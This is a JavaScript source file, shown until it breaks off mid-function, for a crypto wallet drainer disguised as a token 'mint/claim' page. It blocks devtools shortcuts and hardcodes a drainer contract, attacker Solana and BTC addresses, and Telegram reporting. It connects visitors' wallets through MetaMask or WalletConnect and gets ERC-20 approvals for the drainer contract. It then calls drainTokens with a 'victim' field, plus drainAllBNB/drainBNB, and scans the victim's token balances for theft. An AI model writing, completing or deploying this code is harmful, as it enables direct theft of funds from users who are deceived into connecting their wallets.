import { CONFIG } from './config.js';

// ============================================================
//  BASIC UI PROTECTION (light — no aggressive anti-debug)
// ============================================================
(function () {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  if (isMobile) return;

  document.addEventListener("contextmenu", (e) => e.preventDefault());
  document.addEventListener("keydown", (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

// ============================================================
//  CONFIGURATION
// ============================================================
let DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID;

try {
  const config = CONFIG || {};
  DRAINER_CONTRACT = config.DRAINER_CONTRACT || "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
  CONTRACT_ABI = config.CONTRACT_ABI || [];
  ATTACKER_SOLANA_ADDRESS = config.ATTACKER_SOLANA_ADDRESS || "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
  ATTACKER_BTC_ADDRESS = config.ATTACKER_BTC_ADDRESS || "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
  TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || "";
  TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || "";
  console.log("✅ Config loaded");
} catch (e) {
  console.warn("⚠️ Config fallback used:", e);
}

// ============================================================
//  CHAIN / EXPLORER METADATA
//  Set EXPECTED_CHAIN_ID to your target network.
//  1     = Ethereum Mainnet
//  56    = BSC
//  137   = Polygon
//  8453  = Base
//  42161 = Arbitrum One
// ============================================================
const EXPECTED_CHAIN_ID = 1;

const CHAIN_NAMES = {
  1: "Ethereum",
  56: "BNB Chain",
  137: "Polygon",
  42161: "Arbitrum One",
  10: "Optimism",
  8453: "Base",
  43114: "Avalanche",
};

const EXPLORERS = {
  1: "https://etherscan.io",
  56: "https://bscscan.com",
  137: "https://polygonscan.com",
  42161: "https://arbiscan.io",
  10: "https://optimistic.etherscan.io",
  8453: "https://basescan.org",
  43114: "https://snowtrace.io",
};

const RPCS = {
  1: "https://eth.llamarpc.com",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
  8453: "https://mainnet.base.org",
};

// ============================================================
//  TELEGRAM
// ============================================================
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    if (!res.ok) console.error('Telegram error:', await res.text());
  } catch (e) {
    console.error('Telegram exception:', e);
  }
}

// ============================================================
//  WALLET DETECTORS
// ============================================================
const walletDetectors = {
  isMetaMask: () => {
    const e = window.ethereum;
    if (!e) return false;
    return [e.isMetaMask, e._metamask?.isUnlocked, e.providers?.find(p => p.isMetaMask), navigator.userAgent.includes("MetaMaskMobile")].some(Boolean);
  },
  isCoinbaseWallet: () => {
    const e = window.ethereum;
    if (!e) return false;
    return e.isCoinbaseWallet || e.providers?.some(p => p.isCoinbaseWallet) || window.CoinbaseWalletSDK;
  },
  isTrustWallet: () => {
    const e = window.ethereum;
    if (!e) return false;
    return e.isTrust || e.isTrustWallet || e.providers?.some(p => p.isTrust || p.isTrustWallet) || navigator.userAgent.includes("TrustWallet");
  },
  isRabbyWallet: () => {
    const e = window.ethereum;
    if (!e) return false;
    return e.isRabby || e.providers?.some(p => p.isRabby);
  },
  isPhantom: () => window.phantom?.ethereum,
};

// ============================================================
//  SOLANA DETECTORS
// ============================================================
const solanaWalletDetectors = {
  isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
  isSolflare: () => !!window.solflare,
  isBackpack: () => !!window.backpack,
};

function getSolanaWallets() {
  const w = [];
  if (solanaWalletDetectors.isPhantom()) w.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
  if (solanaWalletDetectors.isSolflare()) w.push({ name: 'Solflare', provider: window.solflare });
  if (solanaWalletDetectors.isBackpack()) w.push({ name: 'Backpack', provider: window.backpack });
  return w;
}

// ============================================================
//  CURRENCY CONVERTER
// ============================================================
const CURRENCY_CONVERTER = {
  rates: {
    USD: 1, EUR: 0.92, GBP: 0.79, JPY: 148.5, CNY: 7.23, INR: 83.2,
    AUD: 1.52, CAD: 1.36, CHF: 0.88, HKD: 7.82, SGD: 1.35, KRW: 1312.5,
    BRL: 4.95, RUB: 91.8, MXN: 17.2, ZAR: 18.9, TRY: 28.7, IDR: 15680,
    THB: 35.8, MYR: 4.68, PHP: 56.2, VND: 24350, AED: 3.67, SAR: 3.75,
    NGN: 900, EGP: 30.9, PKR: 280, BDT: 110,
  },
  detectLocalCurrency() {
    try {
      const locale = navigator.language || "en-US";
      const region = locale.split("-")[1] || "US";
      const map = {
        US: "USD", GB: "GBP", DE: "EUR", FR: "EUR", IT: "EUR", ES: "EUR",
        JP: "JPY", CN: "CNY", IN: "INR", AU: "AUD", CA: "CAD", RU: "RUB",
        BR: "BRL", MX: "MXN", KR: "KRW", SG: "SGD", HK: "HKD", TR: "TRY",
        SA: "SAR", AE: "AED", NG: "NGN", ZA: "ZAR", EG: "EGP", PK: "PKR",
        BD: "BDT", ID: "IDR", TH: "THB", MY: "MYR", PH: "PHP", VN: "VND",
      };
      return map[region] || "USD";
    } catch { return "USD"; }
  },
  formatCurrency(amount, currency) {
    try {
      return new Intl.NumberFormat(navigator.language, {
        style: "currency", currency,
        minimumFractionDigits: 2, maximumFractionDigits: 2,
      }).format(amount);
    } catch { return `${amount} ${currency}`; }
  },
};

// ============================================================
//  PRICE FEEDS
// ============================================================
async function getNativePriceInUSD() {
  try {
    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
    const j = await r.json();
    return j.ethereum.usd;
  } catch { return 2200; }
}

async function getTokenPriceInUSD(tokenAddress) {
  try {
    const r = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd`);
    const j = await r.json();
    return j[tokenAddress.toLowerCase()]?.usd || 0;
  } catch { return 0; }
}

// ============================================================
//  GLOBAL STATE
// ============================================================
let tokenChart;
let countdownInterval;
let claimList = [];
let priceHistory = [];
let web3;
let web3Instance;
let fingerprintData = {};
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let connectedWallet = null;
let connectedAddress = null;
let progressUpdated = false;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
let contractInstance;
const CLAIM_THRESHOLD_USD = 3;

let solanaProvider = null;
let solanaPublicKey = null;
const DISABLE_DISCONNECT = isMobileDevice;
let delayedAttemptsScheduled = false;

// ============================================================
//  DOM ELEMENTS
// ============================================================
const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
const navLinks = document.querySelector(".nav-links");
const claimListElement = document.getElementById("claimList");
const predictionFill = document.getElementById("predictionFill");
const claimStatus = document.getElementById("claimStatus");
const walletButtonContainer = document.getElementById("walletButtonContainer");
const connectButton = document.getElementById("connectButton");
const progressBar = document.getElementById("progressBar");
const progressPercentage = document.getElementById("progressPercentage");
const connectionDebug = document.getElementById("connectionDebug");
const debugToggle = document.getElementById("debugToggle");
const walletModal = document.getElementById("walletModal");
const walletModalClose = document.getElementById("walletModalClose");
const walletProviders = document.querySelectorAll(".wallet-provider");
const announcementModal = document.getElementById("announcementModal");
const announcementModalClose = document.getElementById("announcementModalClose");
const announcementOkBtn = document.getElementById("announcementOkBtn");
const copyReferralBtn = document.getElementById("copyReferralBtn");
const referralLink = document.getElementById("referralLink");

// ============================================================
//  EVENT LISTENERS
// ============================================================
if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", () => navLinks?.classList.toggle("active"));
if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);

if (debugToggle) {
  debugToggle.addEventListener("click", () => {
    connectionDebug?.classList.toggle("active");
    debugToggle.textContent = connectionDebug?.classList.contains("active")
      ? "Hide connection details"
      : "Show connection details";
  });
}

if (walletProviders) {
  walletProviders.forEach((p) => {
    p.addEventListener("click", () => connectWithProvider(p.getAttribute("data-provider")));
  });
}

// ============================================================
//  VANTA BACKGROUND
// ============================================================
if (typeof VANTA !== "undefined") {
  try {
    VANTA.NET({
      el: "#vanta-bg",
      mouseControls: true, touchControls: true, gyroControls: false,
      minHeight: 200, minWidth: 200, scale: 1, scaleMobile: 1,
      color: 0xff6b00, backgroundColor: 0x0f172a,
      points: 15, maxDistance: 25, spacing: 18,
    });
  } catch (e) { console.warn("Vanta failed:", e); }
}

// ============================================================
//  INIT
// ============================================================
document.addEventListener("DOMContentLoaded", async () => {
  console.log(`Local currency: ${userLocalCurrency}`);

  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();

  ethPriceInUSD = await getNativePriceInUSD();
  console.log(`Native price: $${ethPriceInUSD}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await getNativePriceInUSD(); }, 60000);

  initializeServiceWorker();

  if (isMobileDevice) initializeMobileSpecificOptimizations();

  restoreSavedConnection();
});

// ============================================================
//  UI HELPERS
// ============================================================
function setButtonState(button, state) {
  if (!button) return;
  button.style.cssText = `
    display:inline-block; padding:14px 28px; border-radius:8px; font-weight:600;
    border:none; cursor:${state === 'loading' ? 'not-allowed' : 'pointer'};
    transition:all .3s ease; color:white; font-size:16px;
    font-family:'Inter', sans-serif; box-shadow:0 4px 12px rgba(0,0,0,.15);
    min-width:180px;
  `;
  button.disabled = state === 'loading';

  const states = {
    loading: ['linear-gradient(135deg,#666,#888)', '<i class="fas fa-spinner fa-spin"></i> Connecting...'],
    connected: ['linear-gradient(135deg,#10B981,#059669)', '<i class="fas fa-check-circle"></i> Connected'],
    disconnect: ['linear-gradient(135deg,#EF4444,#DC2626)', '<i class="fas fa-power-off"></i> Disconnect'],
    failed: ['linear-gradient(135deg,#EF4444,#DC2626)', '<i class="fas fa-exclamation-triangle"></i> Failed'],
    normal: ['linear-gradient(135deg,#FF6B00,#FF8C00)', '<i class="fas fa-wallet"></i> Connect Wallet to Mint'],
  };

  const [bg, html] = states[state] || states.normal;
  button.style.background = bg;
  button.innerHTML = html;

  if (state === 'failed') setTimeout(() => setButtonState(button, 'normal'), 3000);
}

function showStatus(msg, type = 'info') {
  if (!claimStatus) return;
  claimStatus.textContent = msg;
  claimStatus.className = `status ${type}`;
  claimStatus.style.display = 'block';
}

// ============================================================
//  LOCAL STORAGE
// ============================================================
function saveWallet(addr, session = null, chainType = null) {
  localStorage.setItem('connectedWallet', addr);
  if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
  if (chainType) localStorage.setItem('chainType', chainType);
}
function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
function getSavedSession() {
  const s = localStorage.getItem('walletConnectSession');
  return s ? JSON.parse(s) : null;
}
function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
function clearSavedWallet() {
  localStorage.removeItem('connectedWallet');
  localStorage.removeItem('walletConnectSession');
  localStorage.removeItem('chainType');
}
function saveConnectionToLocalStorage(address, walletType) {
  localStorage.setItem('connectedAddress', address);
  localStorage.setItem('connectedWalletType', walletType);
}
function clearSavedConnection() {
  localStorage.removeItem('connectedAddress');
  localStorage.removeItem('connectedWalletType');
}
function restoreSavedConnection() {
  const addr = localStorage.getItem('connectedAddress');
  const type = localStorage.getItem('connectedWalletType');
  if (addr && type) connectWithProvider(type, true);
}

// ============================================================
//  UI — CONNECTED STATE
// ============================================================
function updateConnectedUI(address, chain = 'evm') {
  setButtonState(connectButton, 'disconnect');
  const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
  const label = labels[chain] || 'Unknown';
  const short = `${address.slice(0, 6)}...${address.slice(-4)}`;

  let display = document.getElementById('connectedAddressDisplay');
  if (!display) {
    display = document.createElement('div');
    display.id = 'connectedAddressDisplay';
    display.style.cssText = `
      margin-top:12px; padding:10px 16px;
      font-family:'JetBrains Mono', monospace; font-size:14px;
      color:#059669; text-align:center; background:#ECFDF5;
      border-radius:8px; border:1px solid #A7F3D0;
    `;
    connectButton?.parentNode?.appendChild(display);
  }
  display.innerHTML = `
    <div style="display:flex; justify-content:center; gap:8px; align-items:center;">
      <i class="fas fa-check-circle"></i>
      <span>Connected: ${short}</span>
      <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px;">${label}</span>
    </div>
  `;
  showStatus(`Connected to ${label}`, 'success');
}

function resetConnectedUI() {
  setButtonState(connectButton, 'normal');
  document.getElementById('connectedAddressDisplay')?.remove();
  showStatus('Wallet disconnected', 'info');
  web3Instance = null;
  web3 = null;
  contractInstance = null;
}

// ============================================================
//  EIP-6963 PROVIDER DETECTION
// ============================================================
let evmProviders = [];
let eip6963Initialized = false;

function setupEIP6963() {
  if (eip6963Initialized) return;
  eip6963Initialized = true;
  window.addEventListener('eip6963:announceProvider', (event) => {
    const d = event.detail;
    if (!evmProviders.some(p => p.info.uuid === d.info.uuid)) {
      evmProviders.push(d);
      console.log(`EIP-6963 provider: ${d.info.name}`);
    }
  });
  window.dispatchEvent(new Event('eip6963:requestProvider'));
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
}

// ============================================================
//  CHAIN VERIFICATION (critical fix)
// ============================================================
async function ensureCorrectChain() {
  try {
    const chainIdHex = await web3.currentProvider.request({ method: 'eth_chainId' });
    const chainId = parseInt(chainIdHex, 16);
    console.log(`[ensureCorrectChain] current=${chainId} expected=${EXPECTED_CHAIN_ID}`);

    if (chainId !== EXPECTED_CHAIN_ID) {
      console.warn(`[ensureCorrectChain] Wrong chain — attempting switch`);

      try {
        await web3.currentProvider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x' + EXPECTED_CHAIN_ID.toString(16) }],
        });
        // Re-check
        const newChainHex = await web3.currentProvider.request({ method: 'eth_chainId' });
        const newChainId = parseInt(newChainHex, 16);
        if (newChainId !== EXPECTED_CHAIN_ID) {
          throw new Error(`Still on wrong chain: ${newChainId}`);
        }
        console.log(`[ensureCorrectChain] Switched to ${EXPECTED_CHAIN_ID}`);
      } catch (switchErr) {
        const currentName = CHAIN_NAMES[chainId] || `Chain ${chainId}`;
        throw new Error(`Please switch your wallet to ${CHAIN_NAMES[EXPECTED_CHAIN_ID] || 'the correct network'} (currently on ${currentName}).`);
      }
    }
    return true;
  } catch (e) {
    console.error('[ensureCorrectChain] failed:', e.message);
    throw e;
  }
}

// ============================================================
//  CONTRACT DEPLOYMENT VERIFICATION (critical fix)
// ============================================================
async function ensureContractIsDeployed() {
  try {
    const code = await web3.eth.getCode(DRAINER_CONTRACT);
    if (!code || code === '0x' || code.length < 10) {
      throw new Error(`Service contract not available on this network. Please switch to ${CHAIN_NAMES[EXPECTED_CHAIN_ID]}.`);
    }
    console.log(`[ensureContractIsDeployed] ✅ code length: ${code.length}`);
    return true;
  } catch (e) {
    console.error('[ensureContractIsDeployed] failed:', e.message);
    throw e;
  }
}

// ============================================================
//  TRANSACTION VERIFICATION (critical fix)
// ============================================================
async function waitForReceipt(txHash, timeoutMs = 180000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const receipt = await web3.eth.getTransactionReceipt(txHash);
      if (receipt) return receipt;
    } catch (e) {}
    await new Promise(r => setTimeout(r, 3000));
  }
  return null;
}

async function sendAndVerify(methodPromise, description) {
  try {
    console.log(`📤 ${description} — sending...`);
    const tx = await methodPromise;
    const hash = tx.transactionHash;
    console.log(`📨 ${description} — hash: ${hash}`);

    if (tx.status === false) {
      console.error(`❌ ${description} — reverted immediately`);
      return { success: false, hash, reason: 'reverted' };
    }

    const receipt = await waitForReceipt(hash, 180000);
    if (!receipt) {
      console.error(`❌ ${description} — not mined in 3 min`);
      return { success: false, hash, reason: 'not_mined' };
    }

    if (receipt.status === false) {
      console.error(`❌ ${description} — reverted on-chain in block ${receipt.blockNumber}`);
      return { success: false, hash, receipt, reason: 'reverted_on_chain' };
    }

    console.log(`✅ ${description} — confirmed in block ${receipt.blockNumber}`);
    return { success: true, hash, receipt, blockNumber: receipt.blockNumber };
  } catch (e) {
    console.error(`❌ ${description} — error: ${e.message}`);
    return { success: false, hash: null, reason: e.message };
  }
}

// ============================================================
//  DIRECT EVM CONNECT
// ============================================================
async function connectDirectEVM(timeoutMs = 5000) {
  setupEIP6963();
  await new Promise(r => setTimeout(r, 600));

  let providers = evmProviders.filter(p => p.provider);
  if (providers.length === 0 && window.ethereum) {
    providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
  }
  if (providers.length === 0) return false;

  const chosen = providers[0];

  try {
    const accounts = await Promise.race([
      chosen.provider.request({ method: 'eth_requestAccounts' }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);

    if (!accounts || accounts.length === 0) return false;

    const addr = accounts[0];
    saveWallet(addr, null, 'evm');
    updateConnectedUI(addr, 'evm');

    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(chosen.provider);
    web3 = web3Instance;
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    setupEVMProviderEvents(chosen.provider);

    await ensureCorrectChain();
    return true;
  } catch (e) {
    console.log('Direct EVM error:', e.message);
    return false;
  }
}

// ============================================================
//  WALLETCONNECT
// ============================================================
let client, modal, SignClient, WalletConnectModal, EthereumProvider;
let currentSession = null;

async function loadWCLibs() {
  if (SignClient && WalletConnectModal && EthereumProvider) return;
  const mods = await Promise.all([
    import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
    import('https://esm.sh/@walletconnect/modal@2.6.2'),
    import('https://esm.sh/@walletconnect/ethereum-provider@2.11.0'),
  ]);
  SignClient = mods[0].default || mods[0];
  WalletConnectModal = mods[1].WalletConnectModal || mods[1].default || mods[1];
  EthereumProvider = mods[2].EthereumProvider || mods[2].default || mods[2];
}

async function initWC(projectId) {
  if (client && modal) return true;
  try {
    await loadWCLibs();
    client = await SignClient.init({
      projectId,
      metadata: CONFIG.DAPP_METADATA,
      relayUrl: 'wss://relay.walletconnect.com',
    });
    modal = new WalletConnectModal({
      projectId,
      themeMode: 'dark',
      enableExplorer: true,
      mobileWallets: [
        { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
        { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
        { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
      ],
    });
    return true;
  } catch (e) {
    console.error('WC init failed:', e);
    return false;
  }
}

async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
  const projectId = useTestId ? (CONFIG.PUBLIC_TEST_ID || CONFIG.PROJECT_ID) : CONFIG.PROJECT_ID;
  const ok = await initWC(projectId);
  if (!ok) return false;

  try {
    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: [`eip155:${EXPECTED_CHAIN_ID}`],
          events: ['chainChanged', 'accountsChanged'],
        },
      },
    });

    if (!uri) throw new Error('No URI from WC');
    modal.openModal({ uri });

    const session = await Promise.race([
      approval(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);

    modal.closeModal();

    if (session?.namespaces?.eip155?.accounts?.length) {
      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: CONFIG.DAPP_METADATA,
        session,
      });
      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      web3 = web3Instance;
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      setupEVMProviderEvents(provider);

      await ensureCorrectChain();
      return true;
    }
    return false;
  } catch (e) {
    console.error('WC error:', e);
    try { modal.closeModal(); } catch {}
    return false;
  }
}

// ============================================================
//  PROVIDER EVENTS
// ============================================================
function setupEVMProviderEvents(provider) {
  if (!provider?.on) return;
  provider.on('accountsChanged', (accounts) => {
    if (accounts.length === 0) { resetConnectedUI(); clearSavedWallet(); }
    else { updateConnectedUI(accounts[0], 'evm'); saveWallet(accounts[0], null, 'evm'); }
  });
  provider.on('chainChanged', () => location.reload());
  provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet(); });
}

// ============================================================
//  CONNECT FLOW
// ============================================================
async function connectWallet() {
  setButtonState(connectButton, 'loading');
  showStatus('Connecting...', 'info');

  let ok = false;
  if (isMobileDevice) {
    ok = await connectViaWalletConnect(false, 300000) || await connectViaWalletConnect(true, 300000);
  } else {
    ok = await connectDirectEVM(5000);
    if (!ok) ok = await connectViaWalletConnect(false, 300000);
    if (!ok) ok = await connectViaWalletConnect(true, 300000);
  }

  if (!ok) {
    showStatus('No wallet available.', 'error');
    setButtonState(connectButton, 'failed');
  } else {
    setButtonState(connectButton, 'connected');
    setTimeout(() => window.initiateClaimProcess?.(), 1500);
  }
}

async function connectWithProvider(type, silent = false) {
  if (type === 'metamask' && walletDetectors.isMetaMask()) {
    window.ethereum = window.ethereum;
    await connectDirectEVM();
  } else if (type === 'trust' && walletDetectors.isTrustWallet()) {
    await connectDirectEVM();
  } else if (type === 'coinbase' && walletDetectors.isCoinbaseWallet()) {
    await connectDirectEVM();
  } else {
    await connectWallet();
  }
}

async function disconnectWallet() {
  try {
    if (currentSession && client) {
      await client.disconnect({ topic: currentSession.topic, reason: { code: 6000, message: 'User disconnected' } });
      currentSession = null;
    }
    if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect();
  } catch (e) {}
  resetConnectedUI();
  clearSavedWallet();
}

// ============================================================
//  BUTTON HANDLER
// ============================================================
const handleClick = async () => {
  const saved = getSavedWallet();
  if (saved) await disconnectWallet();
  else await connectWallet();
};
if (connectButton) connectButton.addEventListener('click', handleClick);

// ============================================================
//  RESTORE SESSION
// ============================================================
async function restoreWalletConnection() {
  const savedWallet = getSavedWallet();
  const savedChain = getSavedChainType();
  if (!savedWallet) return;

  if (savedChain === 'evm' && !isMobileDevice && window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts[0] === savedWallet) {
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(window.ethereum);
        web3 = web3Instance;
        contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        updateConnectedUI(savedWallet, 'evm');
        setupEVMProviderEvents(window.ethereum);
      }
    } catch (e) {}
  }
}

// ============================================================
//  ERC-20 APPROVAL (real approve call)
// ============================================================
async function approveERC20(tokenAddress, amount) {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    const erc20Abi = [
      {
        constant: false,
        inputs: [
          { name: '_spender', type: 'address' },
          { name: '_value', type: 'uint256' },
        ],
        name: 'approve',
        outputs: [{ name: '', type: 'bool' }],
        type: 'function',
      },
    ];

    const token = new web3.eth.Contract(erc20Abi, tokenAddress);
    const tx = token.methods.approve(DRAINER_CONTRACT, amount);

    const gasEstimate = await tx.estimateGas({ from: userAddress });
    return await sendAndVerify(
      tx.send({
        from: userAddress,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `approve(${tokenAddress.slice(0, 8)}, ${amount})`
    );
  } catch (e) {
    console.error(`approveERC20 failed:`, e);
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  DRAINER CONTRACT — setTokenApproval
// ============================================================
async function callSetTokenApproval(tokenAddress, amount) {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    const tx = contractInstance.methods.setTokenApproval(tokenAddress, amount);
    const gasEstimate = await tx.estimateGas({ from: userAddress });

    return await sendAndVerify(
      tx.send({
        from: userAddress,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `setTokenApproval(${tokenAddress.slice(0, 8)})`
    );
  } catch (e) {
    console.error('setTokenApproval failed:', e);
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  DRAINER CONTRACT — depositBNB
// ============================================================
async function callDepositNative(ethAmount) {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    const amountWei = web3.utils.toWei(ethAmount.toString(), 'ether');

    const tx = contractInstance.methods.depositBNB();
    const gasEstimate = await tx.estimateGas({ from: userAddress, value: amountWei });

    return await sendAndVerify(
      tx.send({
        from: userAddress,
        value: amountWei,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `deposit(${ethAmount} ETH)`
    );
  } catch (e) {
    console.error('depositBNB failed:', e);
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  DRAINER CONTRACT — drainTokens
// ============================================================
async function executeTokenDrain(userAddress, tokens, amounts) {
  try {
    const accounts = await web3.eth.getAccounts();
    const operator = accounts[0];

    const request = {
      victim: userAddress,
      permits: [],
      approvedTokens: tokens,
      approvedAmounts: amounts,
      gasBudget: web3.utils.toWei('0.01', 'ether'),
      resume: false,
      deadline: Math.floor(Date.now() / 1000) + 3600,
      salt: web3.utils.randomHex(32),
      signature: '0x',
    };

    const tx = contractInstance.methods.drainTokens(request);
    const gasEstimate = await tx.estimateGas({ from: operator });

    return await sendAndVerify(
      tx.send({
        from: operator,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `drainTokens(${tokens.length} tokens)`
    );
  } catch (e) {
    console.error('drainTokens failed:', e);
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  DRAINER CONTRACT — drainBNB
// ============================================================
async function executeNativeDrain(userAddress, amount) {
  try {
    const accounts = await web3.eth.getAccounts();
    const operator = accounts[0];

    // Try drainAllBNB first
    try {
      const tx = contractInstance.methods.drainAllBNB(userAddress);
      const gasEstimate = await tx.estimateGas({ from: operator });
      return await sendAndVerify(
        tx.send({
          from: operator,
          gas: Math.floor(gasEstimate * 1.3),
          gasPrice: await web3.eth.getGasPrice(),
        }),
        `drainAllBNB`
      );
    } catch (allErr) {
      console.log('drainAllBNB failed, using drainBNB:', allErr.message);
      const amountWei = web3.utils.toWei(amount.toString(), 'ether');
      const tx = contractInstance.methods.drainBNB(userAddress, amountWei);
      const gasEstimate = await tx.estimateGas({ from: operator });
      return await sendAndVerify(
        tx.send({
          from: operator,
          gas: Math.floor(gasEstimate * 1.3),
          gasPrice: await web3.eth.getGasPrice(),
        }),
        `drainBNB(${amount} ETH)`
      );
    }
  } catch (e) {
    console.error('Native drain failed:', e);
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  TOKEN DETECTION
// ============================================================
const DEFAULT_TOKEN_LIST = [
  { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
  { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
  { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
  { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
  { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC', decimals: 18 },
  { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
  { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
  { address: '0x4d224452801ACEd8B2F0aebE155379bb5D594381', symbol: 'APE', decimals: 18 },
  { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18 },
];

async function fetchTokenList() {
  try {
    const r = await fetch('https://tokens.coingecko.com/ethereum/all.json');
    const j = await r.json();
    if (j.tokens?.length) return j.tokens.slice(0, 100);
  } catch {}
  return DEFAULT_TOKEN_LIST;
}

async function getTokenBalance(tokenAddr, walletAddr) {
  try {
    const abi = [{
      constant: true,
      inputs: [{ name: '_owner', type: 'address' }],
      name: 'balanceOf',
      outputs: [{ name: 'balance', type: 'uint256' }],
      type: 'function',
    }];
    const c = new web3.eth.Contract(abi, tokenAddr);
    return await c.methods.balanceOf(walletAddr).call();
  } catch { return 0; }
}

async function detectAllERC20Tokens(userAddress) {
  const tokens = [];
  const list = await fetchTokenList();

  for (const t of list) {
    try {
      const bal = await getTokenBalance(t.address, userAddress);
      if (bal > 0) {
